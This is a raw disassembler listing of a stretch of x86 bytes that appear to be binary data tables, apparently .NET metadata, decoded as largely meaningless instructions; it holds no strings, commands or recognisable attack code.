  4046d5:	00 05 05 ec 09 0a    	add    %al,0xa09ec05
  4046db:	00 18                	add    %bl,(%eax)
  4046dd:	11 55 00             	adc    %edx,0x0(%ebp)
  4046e0:	0a 00                	or     (%eax),%al
  4046e2:	d2 14 55 00 06 00 eb 	rclb   %cl,-0x14fffa00(,%edx,2)
  4046e9:	03 55 00             	add    0x0(%ebp),%edx
  4046ec:	1a 00                	sbb    (%eax),%al
  4046ee:	9c                   	pushf
  4046ef:	04 ff                	add    $0xff,%al
  4046f1:	0f 06                	clts
  4046f3:	00 12                	add    %dl,(%edx)
  4046f5:	00 05 02 06 00 27    	add    %al,0x27000602
  4046fb:	0e                   	push   %cs
  4046fc:	96                   	xchg   %eax,%esi
  4046fd:	0d 0e 00 cb 0f       	or     $0xfcb000e,%eax
  404702:	bb 0b 06 00 cf       	mov    $0xcf00060b,%ebx
  404707:	11 96 0d 06 00 e1    	adc    %edx,-0x1efff9f3(%esi)
  40470d:	04 96                	add    $0x96,%al
  40470f:	0d 26 00 9a 0f       	or     $0xf9a0026,%eax
  404714:	94                   	xchg   %eax,%esp
  404715:	10 26                	adc    %ah,(%esi)
  404717:	00 5a 13             	add    %bl,0x13(%edx)
  40471a:	94                   	xchg   %eax,%esp
  40471b:	10 26                	adc    %ah,(%esi)
  40471d:	00 bb 10 94 10 1a    	add    %bh,0x1a109410(%ebx)
  404723:	00 b3 10 73 12 26    	add    %dh,0x26127310(%ebx)
  404729:	00 72 13             	add    %dh,0x13(%edx)
  40472c:	94                   	xchg   %eax,%esp
  40472d:	10 06                	adc    %al,(%esi)
  40472f:	00 41 0f             	add    %al,0xf(%ecx)
  404732:	96                   	xchg   %eax,%esi
  404733:	0d 06 00 1d 13       	or     $0x131d0006,%eax
  404738:	2b 18                	sub    (%eax),%ebx
  40473a:	06                   	push   %es
  40473b:	00 2b                	add    %ch,(%ebx)
  40473d:	0f 96 0d 06 00 ae 0d 	setbe  0xdae0006
  404744:	2b 18                	sub    (%eax),%ebx
  404746:	06                   	push   %es
  404747:	00 52 04             	add    %dl,0x4(%edx)
  40474a:	2b 18                	sub    (%eax),%ebx
  40474c:	06                   	push   %es
  40474d:	00 26                	add    %ah,(%esi)
  40474f:	04 2b                	add    $0x2b,%al
  404751:	18 06                	sbb    %al,(%esi)
  404753:	00 ea                	add    %ch,%dl
  404755:	0d 2b 18 06 00       	or     $0x6182b,%eax
  40475a:	41                   	inc    %ecx
  40475b:	04 2b                	add    $0x2b,%al
  40475d:	18 06                	sbb    %al,(%esi)
  40475f:	00 14 0f             	add    %dl,(%edi,%ecx,1)
  404762:	2b 18                	sub    (%eax),%ebx
  404764:	06                   	push   %es
  404765:	00 dc                	add    %bl,%ah
  404767:	10 96 0d 06 00 be    	adc    %dl,-0x41fff9f3(%esi)
  40476d:	17                   	pop    %ss
  40476e:	96                   	xchg   %eax,%esi
  40476f:	0d 06 00 52 14       	or     $0x14520006,%eax
  404774:	73 12                	jae    0x404788
  404776:	06                   	push   %es
  404777:	00 be 04 96 0d 00    	add    %bh,0xd9604(%esi)
  40477d:	00 00                	add    %al,(%eax)
  40477f:	00 bd 00 00 00 00    	add    %bh,0x0(%ebp)
  404785:	00 01                	add    %al,(%ecx)
  404787:	00 01                	add    %al,(%ecx)
  404789:	00 01                	add    %al,(%ecx)
  40478b:	00 10                	add    %dl,(%eax)
  40478d:	00 71 0d             	add    %dh,0xd(%ecx)
  404790:	4e                   	dec    %esi
  404791:	16                   	push   %ss
  404792:	3d 00 01 00 01       	cmp    $0x1000100,%eax
  404797:	00 81 01 10 00 9e    	add    %al,-0x61ffefff(%ecx)
  40479d:	13 4e 16             	adc    0x16(%esi),%ecx
  4047a0:	3d 00 01 00 03       	cmp    $0x3000100,%eax
  4047a5:	00 81 01 10 00 94    	add    %al,-0x6bffefff(%ecx)
  4047ab:	15 f5 0e 3d 00       	adc    $0x3d0ef5,%eax
  4047b0:	13 00                	adc    (%eax),%eax
  4047b2:	06                   	push   %es
  4047b3:	00 00                	add    %al,(%eax)
  4047b5:	00 10                	add    %dl,(%eax)
  4047b7:	00 f1                	add    %dh,%cl
  4047b9:	0f ec 0c 3d 00 1e 00 	paddsb 0x24001e00(,%edi,1),%mm1
  4047c0:	24 
  4047c1:	00 00                	add    %al,(%eax)
  4047c3:	00 10                	add    %dl,(%eax)
  4047c5:	00 be 13 38 11 3d    	add    %bh,0x3d113813(%esi)
  4047cb:	00 1e                	add    %bl,(%esi)
  4047cd:	00 26                	add    %ah,(%esi)
  4047cf:	00 81 01 10 00 0a    	add    %al,0xa001001(%ecx)
  4047d5:	0e                   	push   %cs
  4047d6:	38 11                	cmp    %dl,(%ecx)
  4047d8:	3d 00 1e 00 2d       	cmp    $0x2d001e00,%eax
  4047dd:	00 81 01 10 00 84    	add    %al,-0x7bffefff(%ecx)
  4047e3:	10 38                	adc    %bh,(%eax)
  4047e5:	11 3d 00 1e 00 2f    	adc    %edi,0x2f001e00
  4047eb:	00 81 01 10 00 2e    	add    %al,0x2e001001(%ecx)
  4047f1:	12 38                	adc    (%eax),%bh
  4047f3:	11 3d 00 1e 00 30    	adc    %edi,0x30001e00
  4047f9:	00 81 01 10 00 27    	add    %al,0x27001001(%ecx)
  4047ff:	0d 38 11 3d 00       	or     $0x3d1138,%eax
  404804:	1e                   	push   %ds
  404805:	00 36                	add    %dh,(%esi)
  404807:	00 81 01 10 00 28    	add    %al,0x28001001(%ecx)
  40480d:	12 38                	adc    (%eax),%bh
  40480f:	11 3d 00 1f 00 38    	adc    %edi,0x38001f00
  404815:	00 81 01 10 00 7c    	add    %al,0x7c001001(%ecx)
  40481b:	0c 38                	or     $0x38,%al
  40481d:	11 3d 00 1f 00 3e    	adc    %edi,0x3e001f00
  404823:	00 81 01 10 00 7d    	add    %al,0x7d001001(%ecx)
  404829:	18 38                	sbb    %bh,(%eax)
  40482b:	11 3d 00 1f 00 41    	adc    %edi,0x41001f00
  404831:	00 81 01 10 00 8d    	add    %al,-0x72ffefff(%ecx)
  404837:	15 6f 15 3d 00       	adc    $0x3d156f,%eax
  40483c:	20 00                	and    %al,(%eax)
  40483e:	46                   	inc    %esi
  40483f:	00 01                	add    %al,(%ecx)
  404841:	00 10                	add    %dl,(%eax)
  404843:	00 a6 00 9d 0d 3d    	add    %ah,0x3d0d9d00(%esi)
  404849:	00 21                	add    %ah,(%ecx)
  40484b:	00 4b 00             	add    %cl,0x0(%ebx)
  40484e:	81 01 10 00 9f 00    	addl   $0x9f0010,(%ecx)
  404854:	9d                   	popf
  404855:	0d 3d 00 28 00       	or     $0x28003d,%eax
  40485a:	52                   	push   %edx
  40485b:	00 00                	add    %al,(%eax)
  40485d:	01 00                	add    %eax,(%eax)
  40485f:	00 c6                	add    %al,%dh
  404861:	00 00                	add    %al,(%eax)
  404863:	00 3d 00 28 00 54    	add    %bh,0x54002800
  404869:	00 02                	add    %al,(%edx)
  40486b:	01 00                	add    %eax,(%eax)
  40486d:	00 6f 01             	add    %ch,0x1(%edi)
  404870:	00 00                	add    %al,(%eax)
  404872:	d1 00                	roll   $1,(%eax)
  404874:	29 00                	sub    %eax,(%eax)
  404876:	54                   	push   %esp
  404877:	00 83 01 10 00 6d    	add    %al,0x6d001001(%ebx)
  40487d:	00 00                	add    %al,(%eax)
  40487f:	00 3d 00 2d 00 54    	add    %bh,0x54002d00
  404885:	00 15 01 00 00 38    	add    %dl,0x38000001
  40488b:	00 00                	add    %al,(%eax)
  40488d:	00 05 01 2e 00 54    	add    %al,0x54002e01
  404893:	00 16                	add    %dl,(%esi)
  404895:	00 df                	add    %bl,%bh
  404897:	14 83                	adc    $0x83,%al
  404899:	05 16 00 ec 14       	add    $0x14ec0016,%eax
  40489e:	83 05 16 00 7b 0e 83 	addl   $0xffffff83,0xe7b0016
  4048a5:	05 16 00 f3 0c       	add    $0xcf30016,%eax
  4048aa:	83 05 16 00 76 10 83 	addl   $0xffffff83,0x10760016
  4048b1:	05 16 00 10 05       	add    $0x5100016,%eax
  4048b6:	83 05 16 00 22 18 83 	addl   $0xffffff83,0x18220016
  4048bd:	05 16 00 cc 01       	add    $0x1cc0016,%eax
  4048c2:	83 05 16 00 01 07 83 	addl   $0xffffff83,0x7010016
  4048c9:	05 16 00 ba 06       	add    $0x6ba0016,%eax
  4048ce:	83 05 16 00 fb 06 86 	addl   $0xffffff86,0x6fb0016
  4048d5:	05 16 00 b2 0b       	add    $0xbb20016,%eax
  4048da:	83 05 16 00 ad 00 8a 	addl   $0xffffff8a,0xad0016
  4048e1:	05 16 00 43 0e       	add    $0xe430016,%eax
  4048e6:	83 05 16 00 a0 01 83 	addl   $0xffffff83,0x1a00016
  4048ed:	05 16 00 b3 02       	add    $0x2b30016,%eax
  4048f2:	83 05 16 00 a6 17 83 	addl   $0xffffff83,0x17a60016
  4048f9:	05 16 00 eb 0f       	add    $0xfeb0016,%eax
  4048fe:	83 05 11 00 bf 03 8e 	addl   $0xffffff8e,0x3bf0011
  404905:	05 11 00 a4 03       	add    $0x3a40011,%eax
  40490a:	92                   	xchg   %eax,%edx
  40490b:	05 11 00 74 03       	add    $0x3740011,%eax
  404910:	96                   	xchg   %eax,%esi
  404911:	05 11 00 0a 03       	add    $0x30a0011,%eax
  404916:	9a 05 11 00 8c 03 9a 	lcall  $0x9a03,$0x8c001105
  40491d:	05 11 00 ef 02       	add    $0x2ef0011,%eax
  404922:	9d                   	popf
  404923:	05 11 00 d2 02       	add    $0x2d20011,%eax
  404928:	a1 05 31 00 b8       	mov    0xb8003105,%eax
  40492d:	02 a4 05 11 00 26 03 	add    0x3260011(%ebp,%eax,1),%ah
  404934:	9d                   	popf
  404935:	05 11 00 5a 03       	add    $0x35a0011,%eax
  40493a:	48                   	dec    %eax
  40493b:	03 11                	add    (%ecx),%edx
  40493d:	00 3c 03             	add    %bh,(%ebx,%eax,1)
  404940:	a1 05 16 00 cf       	mov    0xcf001605,%eax
  404945:	0f                   	xstore-rng (bad)
  404946:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  404947:	05 31 00 6c 01       	add    $0x16c0031,%eax
  40494c:	83 05 16 00 dc 13 ac 	addl   $0xffffffac,0x13dc0016
  404953:	05 51 80 a4 0b       	add    $0xba48051,%eax
  404958:	48                   	dec    %eax
  404959:	03 51 80             	add    -0x80(%ecx),%edx
  40495c:	a0 0b 48 03 51       	mov    0x5103480b,%al
  404961:	80 97 0b 48 03 51 80 	adcb   $0x80,0x5103480b(%edi)
  404968:	7b 0b                	jnp    0x404975
  40496a:	48                   	dec    %eax
  40496b:	03 21                	add    (%ecx),%esp
  40496d:	00 26                	add    %ah,(%esi)
  40496f:	18 96 05 21 00 07    	sbb    %dl,0x7002105(%esi)
  404975:	18 96 05 31 00 ca    	sbb    %dl,-0x35ffcefb(%esi)
  40497b:	15 96 05 33 01       	adc    $0x1330596,%eax
  404980:	e5 00                	in     $0x0,%eax
  404982:	b6 05                	mov    $0x5,%dh
  404984:	06                   	push   %es
  404985:	06                   	push   %es
  404986:	d0 01                	rolb   $1,(%ecx)
  404988:	ba 05 56 80 a5       	mov    $0xa5805605,%edx
  40498d:	01 bd 05 56 80 3c    	add    %edi,0x3c805605(%ebp)
  404993:	01 bd 05 56 80 29    	add    %edi,0x29805605(%ebp)
  404999:	01 bd 05 16 00 0b    	add    %edi,0xb001605(%ebp)
  40499f:	00 c1                	add    %al,%cl
  4049a1:	05 50 20 00 00       	add    $0x2050,%eax
  4049a6:	00 00                	add    %al,(%eax)
  4049a8:	96                   	xchg   %eax,%esi
  4049a9:	00 12                	add    %dl,(%edx)
  4049ab:	0e                   	push   %cs
  4049ac:	bc 01 01 00 5c       	mov    $0x5c000101,%esp
  4049b1:	21 00                	and    %eax,(%eax)
  4049b3:	00 00                	add    %al,(%eax)
  4049b5:	00 86 18 d9 11 06    	add    %al,0x611d918(%esi)
  4049bb:	00 01                	add    %al,(%ecx)
  4049bd:	00 68 21             	add    %ch,0x21(%eax)
  4049c0:	00 00                	add    %al,(%eax)
  4049c2:	00 00                	add    %al,(%eax)
  4049c4:	96                   	xchg   %eax,%esi
  4049c5:	00 94 13 c9 02 01 00 	add    %dl,0x102c9(%ebx,%edx,1)
  4049cc:	7c 21                	jl     0x4049ef
  4049ce:	00 00                	add    %al,(%eax)
  4049d0:	00 00                	add    %al,(%eax)
  4049d2:	91                   	xchg   %eax,%ecx
  4049d3:	00 4b 0b             	add    %cl,0xb(%ebx)
  4049d6:	c9                   	leave
  4049d7:	02 01                	add    (%ecx),%al
  4049d9:	00 e8                	add    %ch,%al
  4049db:	21 00                	and    %eax,(%eax)
  4049dd:	00 00                	add    %al,(%eax)
  4049df:	00 91 18 df 11 bc    	add    %dl,-0x43ee20e8(%ecx)
  4049e5:	01 01                	add    %eax,(%ecx)
  4049e7:	00 a4 22 00 00 00 00 	add    %ah,0x0(%edx,%eiz,1)
  4049ee:	96                   	xchg   %eax,%esi
  4049ef:	08 24 16             	or     %ah,(%esi,%edx,1)
  4049f2:	de 05 01 00 ab 22    	fiadds 0x22ab0001
  4049f8:	00 00                	add    %al,(%eax)
  4049fa:	00 00                	add    %al,(%eax)
  4049fc:	96                   	xchg   %eax,%esi
  4049fd:	08 32                	or     %dh,(%edx)
  4049ff:	16                   	push   %ss
  404a00:	e3 05                	jecxz  0x404a07
  404a02:	01 00                	add    %eax,(%eax)
  404a04:	b3 22                	mov    $0x22,%bl
  404a06:	00 00                	add    %al,(%eax)
  404a08:	00 00                	add    %al,(%eax)
  404a0a:	96                   	xchg   %eax,%esi
  404a0b:	08 08                	or     %cl,(%eax)
  404a0d:	16                   	push   %ss
  404a0e:	e9 05 02 00 ba       	jmp    0xba404c18
  404a13:	22 00                	and    (%eax),%al
  404a15:	00 00                	add    %al,(%eax)
  404a17:	00 96 08 16 16 ee    	add    %dl,-0x11e9e9f8(%esi)
  404a1d:	05 02 00 c2 22       	add    $0x22c20002,%eax
  404a22:	00 00                	add    %al,(%eax)
  404a24:	00 00                	add    %al,(%eax)
  404a26:	91                   	xchg   %eax,%ecx
  404a27:	08 cd                	or     %cl,%ch
  404a29:	10 f4                	adc    %dh,%ah
  404a2b:	05 03 00 c9 22       	add    $0x22c90003,%eax
  404a30:	00 00                	add    %al,(%eax)
  404a32:	00 00                	add    %al,(%eax)
  404a34:	91                   	xchg   %eax,%ecx
  404a35:	08 d8                	or     %bl,%al
  404a37:	10 f9                	adc    %bh,%cl
  404a39:	05 03 00 d1 22       	add    $0x22d10003,%eax
  404a3e:	00 00                	add    %al,(%eax)
  404a40:	00 00                	add    %al,(%eax)
  404a42:	91                   	xchg   %eax,%ecx
  404a43:	08 7a 09             	or     %bh,0x9(%edx)
  404a46:	ff 05 04 00 d8 22    	incl   0x22d80004
  404a4c:	00 00                	add    %al,(%eax)
  404a4e:	00 00                	add    %al,(%eax)
  404a50:	91                   	xchg   %eax,%ecx
  404a51:	08 89 09 03 06 04    	or     %cl,0x4060309(%ecx)
  404a57:	00 e0                	add    %ah,%al
  404a59:	22 00                	and    (%eax),%al
  404a5b:	00 00                	add    %al,(%eax)
  404a5d:	00 91 08 a1 15 ff    	add    %dl,-0xea5ef8(%ecx)
  404a63:	05 05 00 e7 22       	add    $0x22e70005,%eax
  404a68:	00 00                	add    %al,(%eax)
  404a6a:	00 00                	add    %al,(%eax)
  404a6c:	91                   	xchg   %eax,%ecx
  404a6d:	08 ac 15 03 06 05 00 	or     %ch,0x50603(%ebp,%edx,1)
  404a74:	ef                   	out    %eax,(%dx)
  404a75:	22 00                	and    (%eax),%al
  404a77:	00 00                	add    %al,(%eax)
  404a79:	00 91 08 2f 09 08    	add    %dl,0x8092f08(%ecx)
  404a7f:	06                   	push   %es
  404a80:	06                   	push   %es
  404a81:	00 f6                	add    %dh,%dh
  404a83:	22 00                	and    (%eax),%al
  404a85:	00 00                	add    %al,(%eax)
  404a87:	00 91 08 3d 09 0d    	add    %dl,0xd093d08(%ecx)
  404a8d:	06                   	push   %es
  404a8e:	06                   	push   %es
  404a8f:	00 fe                	add    %bh,%dh
  404a91:	22 00                	and    (%eax),%al
  404a93:	00 00                	add    %al,(%eax)
  404a95:	00 96 08 81 02 c9    	add    %dl,-0x36fd7ef8(%esi)
  404a9b:	02 07                	add    (%edi),%al
  404a9d:	00 05 23 00 00 00    	add    %al,0x23
  404aa3:	00 96 08 91 02 13    	add    %dl,0x13029108(%esi)
  404aa9:	06                   	push   %es
  404aaa:	07                   	pop    %es
  404aab:	00 0d 23 00 00 00    	add    %cl,0x23
  404ab1:	00 91 08 36 02 18    	add    %dl,0x18023608(%ecx)
  404ab7:	06                   	push   %es
  404ab8:	08 00                	or     %al,(%eax)
  404aba:	14 23                	adc    $0x23,%al
  404abc:	00 00                	add    %al,(%eax)
  404abe:	00 00                	add    %al,(%eax)
  404ac0:	91                   	xchg   %eax,%ecx
  404ac1:	08 da                	or     %bl,%dl
  404ac3:	09 08                	or     %ecx,(%eax)
  404ac5:	06                   	push   %es
  404ac6:	08 00                	or     %al,(%eax)
  404ac8:	1b 23                	sbb    (%ebx),%esp
  404aca:	00 00                	add    %al,(%eax)
  404acc:	00 00                	add    %al,(%eax)
  404ace:	91                   	xchg   %eax,%ecx
  404acf:	08 e3                	or     %ah,%bl
  404ad1:	09 0d 06 08 00 23    	or     %ecx,0x23000806
  404ad7:	23 00                	and    (%eax),%eax
  404ad9:	00 00                	add    %al,(%eax)
  404adb:	00 96 08 d2 0c 83    	add    %dl,-0x7cf32df8(%esi)
  404ae1:	02 09                	add    (%ecx),%cl
  404ae3:	00 2a                	add    %ch,(%edx)
  404ae5:	23 00                	and    (%eax),%eax
  404ae7:	00 00                	add    %al,(%eax)
  404ae9:	00 96 08 df 0c 2c    	add    %dl,0x2c0cdf08(%esi)
  404aef:	00 09                	add    %cl,(%ecx)
  404af1:	00 32                	add    %dh,(%edx)
  404af3:	23 00                	and    (%eax),%eax
  404af5:	00 00                	add    %al,(%eax)
  404af7:	00 96 08 f1 0a c9    	add    %dl,-0x36f50ef8(%esi)
  404afd:	02 0a                	add    (%edx),%cl
  404aff:	00 39                	add    %bh,(%ecx)
  404b01:	23 00                	and    (%eax),%eax
  404b03:	00 00                	add    %al,(%eax)
  404b05:	00 96 08 02 0b 13    	add    %dl,0x130b0208(%esi)
  404b0b:	06                   	push   %es
  404b0c:	0a 00                	or     (%eax),%al
  404b0e:	44                   	inc    %esp
  404b0f:	23 00                	and    (%eax),%eax
  404b11:	00 00                	add    %al,(%eax)
  404b13:	00 96 00 f7 15 bc    	add    %dl,-0x43ea0900(%esi)
  404b19:	01 0b                	add    %ecx,(%ebx)
  404b1b:	00 bc 26 00 00 00 00 	add    %bh,0x0(%esi,%eiz,1)
  404b22:	91                   	xchg   %eax,%ecx
  404b23:	00 05 06 36 00 0b    	add    %al,0xb003606
  404b29:	00 d8                	add    %bl,%al
  404b2b:	26 00 00             	add    %al,%es:(%eax)
  404b2e:	00 00                	add    %al,(%eax)
  404b30:	91                   	xchg   %eax,%ecx
  404b31:	00 f3                	add    %dh,%bl
  404b33:	06                   	push   %es
  404b34:	1c 06                	sbb    $0x6,%al
  404b36:	0c 00                	or     $0x0,%al
  404b38:	ec                   	in     (%dx),%al
  404b39:	26 00 00             	add    %al,%es:(%eax)
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	96                   	xchg   %eax,%esi
  404b3f:	00 4b 15             	add    %cl,0x15(%ebx)
  404b42:	bc 01 10 00 60       	mov    $0x60001001,%esp
  404b47:	27                   	daa
  404b48:	00 00                	add    %al,(%eax)
  404b4a:	00 00                	add    %al,(%eax)
  404b4c:	96                   	xchg   %eax,%esi
  404b4d:	00 d8                	add    %bl,%al
  404b4f:	01 27                	add    %esp,(%edi)
  404b51:	06                   	push   %es
  404b52:	10 00                	adc    %al,(%eax)
  404b54:	a8 29                	test   $0x29,%al
  404b56:	00 00                	add    %al,(%eax)
  404b58:	00 00                	add    %al,(%eax)
  404b5a:	96                   	xchg   %eax,%esi
  404b5b:	00 df                	add    %bl,%bh
  404b5d:	03 f9                	add    %ecx,%edi
  404b5f:	05 11 00 30 2b       	add    $0x2b300011,%eax
  404b64:	00 00                	add    %al,(%eax)
  404b66:	00 00                	add    %al,(%eax)
  404b68:	96                   	xchg   %eax,%esi
  404b69:	00 84 15 a5 01 12 00 	add    %al,0x1201a5(%ebp,%edx,1)
  404b70:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  404b71:	2b 00                	sub    (%eax),%eax
  404b73:	00 00                	add    %al,(%eax)
  404b75:	00 91 00 0e 0b a5    	add    %dl,-0x5af4f200(%ecx)
  404b7b:	01 13                	add    %edx,(%ebx)
  404b7d:	00 f0                	add    %dh,%al
  404b7f:	2b 00                	sub    (%eax),%eax
  404b81:	00 00                	add    %al,(%eax)
  404b83:	00 91 18 df 11 bc    	add    %dl,-0x43ee20e8(%ecx)
  404b89:	01 14 00             	add    %edx,(%eax,%eax,1)
  404b8c:	fc                   	cld
  404b8d:	2b 00                	sub    (%eax),%eax
  404b8f:	00 00                	add    %al,(%eax)
  404b91:	00 96 00 f3 0c bc    	add    %dl,-0x43f30d00(%esi)
  404b97:	01 14 00             	add    %edx,(%eax,%eax,1)
  404b9a:	18 2f                	sbb    %ch,(%edi)
  404b9c:	00 00                	add    %al,(%eax)
  404b9e:	00 00                	add    %al,(%eax)
  404ba0:	86 18                	xchg   %bl,(%eax)
  404ba2:	d9 11                	fsts   (%ecx)
  404ba4:	06                   	push   %es
  404ba5:	00 14 00             	add    %dl,(%eax,%eax,1)
  404ba8:	24 2f                	and    $0x2f,%al
  404baa:	00 00                	add    %al,(%eax)
  404bac:	00 00                	add    %al,(%eax)
  404bae:	96                   	xchg   %eax,%esi
  404baf:	00 cc                	add    %cl,%ah
  404bb1:	13 bc 01 14 00 64 2f 	adc    0x2f640014(%ecx,%eax,1),%edi
  404bb8:	00 00                	add    %al,(%eax)
  404bba:	00 00                	add    %al,(%eax)
  404bbc:	91                   	xchg   %eax,%ecx
  404bbd:	00 58 0c             	add    %bl,0xc(%eax)
  404bc0:	c9                   	leave
  404bc1:	02 14 00             	add    (%eax,%eax,1),%dl
  404bc4:	bc 2f 00 00 00       	mov    $0x2f,%esp
  404bc9:	00 91 00 9b 01 c9    	add    %dl,-0x36fe6500(%ecx)
  404bcf:	02 14 00             	add    (%eax,%eax,1),%dl
  404bd2:	0c 30                	or     $0x30,%al
  404bd4:	00 00                	add    %al,(%eax)
  404bd6:	00 00                	add    %al,(%eax)
  404bd8:	91                   	xchg   %eax,%ecx
  404bd9:	00 4e 11             	add    %cl,0x11(%esi)
  404bdc:	c9                   	leave
  404bdd:	02 14 00             	add    (%eax,%eax,1),%dl
  404be0:	3c 31                	cmp    $0x31,%al
  404be2:	00 00                	add    %al,(%eax)
  404be4:	00 00                	add    %al,(%eax)
  404be6:	91                   	xchg   %eax,%ecx
  404be7:	00 f0                	add    %dh,%al
  404be9:	10 c9                	adc    %cl,%cl
  404beb:	02 14 00             	add    (%eax,%eax,1),%dl
  404bee:	7c 31                	jl     0x404c21
  404bf0:	00 00                	add    %al,(%eax)
  404bf2:	00 00                	add    %al,(%eax)
  404bf4:	91                   	xchg   %eax,%ecx
  404bf5:	00 85 04 c9 02 14    	add    %al,0x1402c904(%ebp)
  404bfb:	00 c4                	add    %al,%ah
  404bfd:	31 00                	xor    %eax,(%eax)
  404bff:	00 00                	add    %al,(%eax)
  404c01:	00 86 18 d9 11 06    	add    %al,0x611d918(%esi)
  404c07:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c0a:	d0 31                	shlb   $1,(%ecx)
  404c0c:	00 00                	add    %al,(%eax)
  404c0e:	00 00                	add    %al,(%eax)
  404c10:	96                   	xchg   %eax,%esi
  404c11:	00 5d 01             	add    %bl,0x1(%ebp)
  404c14:	30 02                	xor    %al,(%edx)
  404c16:	14 00                	adc    $0x0,%al
  404c18:	50                   	push   %eax
  404c19:	32 00                	xor    (%eax),%al
  404c1b:	00 00                	add    %al,(%eax)
  404c1d:	00 96 00 43 0b 5d    	add    %dl,0x5d0b4300(%esi)
  404c23:	00 14 00             	add    %dl,(%eax,%eax,1)
  404c26:	c8 32 00 00          	enter  $0x32,$0x0
  404c2a:	00 00                	add    %al,(%eax)
  404c2c:	96                   	xchg   %eax,%esi
  404c2d:	00 62 0f             	add    %ah,0xf(%edx)
  404c30:	f4                   	hlt
  404c31:	05 15 00 98 34       	add    $0x34980015,%eax
  404c36:	00 00                	add    %al,(%eax)
  404c38:	00 00                	add    %al,(%eax)
  404c3a:	96                   	xchg   %eax,%esi
  404c3b:	00 4c 0e c9          	add    %cl,-0x37(%esi,%ecx,1)
  404c3f:	02 15 00 c0 34 00    	add    0x34c000,%dl
  404c45:	00 00                	add    %al,(%eax)
  404c47:	00 96 00 bd 15 bc    	add    %dl,-0x43ea4300(%esi)
  404c4d:	01 15 00 30 35 00    	add    %edx,0x353000
  404c53:	00 00                	add    %al,(%eax)
  404c55:	00 96 00 f2 14 30    	add    %dl,0x3014f200(%esi)
  404c5b:	02 15 00 18 36 00    	add    0x361800,%dl
  404c61:	00 00                	add    %al,(%eax)
  404c63:	00 96 00 c2 10 2d    	add    %dl,0x2d10c200(%esi)
  404c69:	06                   	push   %es
  404c6a:	15 00 68 36 00       	adc    $0x366800,%eax
  404c6f:	00 00                	add    %al,(%eax)
  404c71:	00 96 00 be 0f bc    	add    %dl,-0x43f04200(%esi)
  404c77:	01 16                	add    %edx,(%esi)
  404c79:	00 9c 36 00 00 00 00 	add    %bl,0x0(%esi,%esi,1)
  404c80:	96                   	xchg   %eax,%esi
  404c81:	00 38                	add    %bh,(%eax)
  404c83:	05 30 02 16 00       	add    $0x160230,%eax
  404c88:	fc                   	cld
  404c89:	36 00 00             	add    %al,%ss:(%eax)
  404c8c:	00 00                	add    %al,(%eax)
  404c8e:	96                   	xchg   %eax,%esi
  404c8f:	00 9a 17 c9 02 16    	add    %bl,0x1602c917(%edx)
  404c95:	00 24 37             	add    %ah,(%edi,%esi,1)
  404c98:	00 00                	add    %al,(%eax)
  404c9a:	00 00                	add    %al,(%eax)
  404c9c:	96                   	xchg   %eax,%esi
  404c9d:	00 8f 17 bc 01 16    	add    %cl,0x1601bc17(%edi)
  404ca3:	00 00                	add    %al,(%eax)
  404ca5:	00 00                	add    %al,(%eax)
  404ca7:	00 80 00 96 20 68    	add    %al,0x68209600(%eax)
  404cad:	17                   	pop    %ss
  404cae:	36 06                	ss push %es
  404cb0:	16                   	push   %ss
  404cb1:	00 00                	add    %al,(%eax)
  404cb3:	00 00                	add    %al,(%eax)
  404cb5:	00 80 00 96 20 55    	add    %al,0x55209600(%eax)
  404cbb:	17                   	pop    %ss
  404cbc:	3a 06                	cmp    (%esi),%al
  404cbe:	16                   	push   %ss
  404cbf:	00 00                	add    %al,(%eax)
  404cc1:	00 00                	add    %al,(%eax)
  404cc3:	00 80 00 96 20 d1    	add    %al,-0x2edf6a00(%eax)
  404cc9:	04 43                	add    $0x43,%al
  404ccb:	06                   	push   %es
  404ccc:	19 00                	sbb    %eax,(%eax)
  404cce:	00 00                	add    %al,(%eax)
  404cd0:	00 00                	add    %al,(%eax)
  404cd2:	80 00 96             	addb   $0x96,(%eax)
  404cd5:	20 8a 16 48 06 1a    	and    %cl,0x1a064816(%edx)
  404cdb:	00 00                	add    %al,(%eax)
  404cdd:	00 00                	add    %al,(%eax)
  404cdf:	00 80 00 96 20 37    	add    %al,0x37209600(%eax)
  404ce5:	07                   	pop    %es
  404ce6:	4f                   	dec    %edi
  404ce7:	06                   	push   %es
  404ce8:	1c 00                	sbb    $0x0,%al
  404cea:	00 00                	add    %al,(%eax)
  404cec:	00 00                	add    %al,(%eax)
  404cee:	80 00 96             	addb   $0x96,(%eax)
  404cf1:	20 64 0c 56          	and    %ah,0x56(%esp,%ecx,1)
  404cf5:	06                   	push   %es
  404cf6:	1d 00 54 37 00       	sbb    $0x375400,%eax
  404cfb:	00 00                	add    %al,(%eax)
  404cfd:	00 96 00 1b 0a 5d    	add    %dl,0x5d0a1b00(%esi)
  404d03:	06                   	push   %es
  404d04:	20 00                	and    %al,(%eax)
  404d06:	80 37 00             	xorb   $0x0,(%edi)
  404d09:	00 00                	add    %al,(%eax)
  404d0b:	00 96 00 64 15 bc    	add    %dl,-0x43ea9c00(%esi)
  404d11:	01 22                	add    %esp,(%edx)
  404d13:	00 c8                	add    %cl,%al
  404d15:	37                   	aaa
  404d16:	00 00                	add    %al,(%eax)
  404d18:	00 00                	add    %al,(%eax)
  404d1a:	96                   	xchg   %eax,%esi
  404d1b:	00 c5                	add    %al,%ch
  404d1d:	15 bc 01 22 00       	adc    $0x2201bc,%eax
  404d22:	08 38                	or     %bh,(%eax)
  404d24:	00 00                	add    %al,(%eax)
  404d26:	00 00                	add    %al,(%eax)
  404d28:	96                   	xchg   %eax,%esi
  404d29:	00 20                	add    %ah,(%eax)
  404d2b:	09 65 06             	or     %esp,0x6(%ebp)
  404d2e:	22 00                	and    (%eax),%al
  404d30:	74 38                	je     0x404d6a
  404d32:	00 00                	add    %al,(%eax)
  404d34:	00 00                	add    %al,(%eax)
  404d36:	96                   	xchg   %eax,%esi
  404d37:	00 17                	add    %dl,(%edi)
  404d39:	09 62 00             	or     %esp,0x0(%edx)
  404d3c:	24 00                	and    $0x0,%al
  404d3e:	e4 38                	in     $0x38,%al
  404d40:	00 00                	add    %al,(%eax)
  404d42:	00 00                	add    %al,(%eax)
  404d44:	96                   	xchg   %eax,%esi
  404d45:	00 0b                	add    %cl,(%ebx)
  404d47:	09 36                	or     %esi,(%esi)
  404d49:	00 25 00 50 39 00    	add    %ah,0x395000
  404d4f:	00 00                	add    %al,(%eax)
